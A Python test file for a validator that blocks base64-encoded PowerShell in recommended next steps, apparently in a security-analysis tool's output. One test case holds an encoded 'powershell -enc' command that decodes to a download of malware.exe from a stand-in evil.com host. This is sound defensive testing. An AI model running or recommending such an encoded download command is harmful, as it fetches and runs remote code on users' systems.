
"""Test the new base64 PowerShell pattern."""

# Allow running from tests/ by adding parent dir to sys.path
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import json
from src.schemas import AnalysisOutput
from src.security import validate_output

# Test Case 1: Clean recommendation (should pass)
clean_data = {
    "status": "success",
    "findings": [],
    "hypotheses": [],
    "indicators_of_compromise": [],
    "recommended_next_steps": [
        "Review process tree for suspicious activity",
        "Check authentication logs for failed logins"
    ],
    "confidence": 0.85
}

validated = AnalysisOutput.model_validate(clean_data)
# Convert to JSON string (how main.py calls it)
response_text = json.dumps(clean_data, ensure_ascii=False)
is_valid, error_msg = validate_output(response_text)
print(f"Test 1 (Clean): Valid={is_valid}, Error={error_msg}")
assert is_valid == True, "Clean data should pass!"

# Test Case 2: Base64-encoded PowerShell (should fail)
encoded_ps_data = {
    "status": "success",
    "findings": [],
    "hypotheses": [],
    "indicators_of_compromise": [],
    "recommended_next_steps": [
        "Run powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgBlAC4AZQB4AGU="
    ],
    "confidence": 0.85
}

validated = AnalysisOutput.model_validate(encoded_ps_data)
response_text = json.dumps(encoded_ps_data, ensure_ascii=False)
is_valid, error_msg = validate_output(response_text)
print(f"Test 2 (Base64 PS): Valid={is_valid}, Error={error_msg}")
if not is_valid:
    print(f"  → Blocked! Error: {error_msg}")
assert is_valid == False, "Base64 PowerShell should be blocked!"

# Test Case 3: Multiple encoding flags (should fail)
test_cases = [
    "pwsh.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
    "POWERSHELL -e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
    "powershell.exe -ec VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEgAZQBsAGwAbwAiAA==",
]

for idx, test_cmd in enumerate(test_cases, 3):
    test_data = {
        "status": "success",
        "findings": [],
        "hypotheses": [],
        "indicators_of_compromise": [],
        "recommended_next_steps": [test_cmd],
        "confidence": 0.85
    }
    
    response_text = json.dumps(test_data, ensure_ascii=False)
    is_valid, error_msg = validate_output(response_text)
    print(f"Test {idx}: Valid={is_valid}")
    assert is_valid == False, f"Test case {idx} should be blocked!"

# Test Case 4: Normal PowerShell (should pass - not base64)
normal_ps_data = {
    "status": "success",
    "findings": [],
    "hypotheses": [],
    "indicators_of_compromise": [],
    "recommended_next_steps": [
        "Run powershell Get-Process to check for suspicious processes"
    ],
    "confidence": 0.85
}

response_text = json.dumps(normal_ps_data, ensure_ascii=False)
is_valid, error_msg = validate_output(response_text)
print(f"Test 4 (Normal PS): Valid={is_valid}, Error={error_msg}")
assert is_valid == True, "Normal PowerShell commands should pass!"

print("\n✅ All tests passed! Your new pattern works correctly.")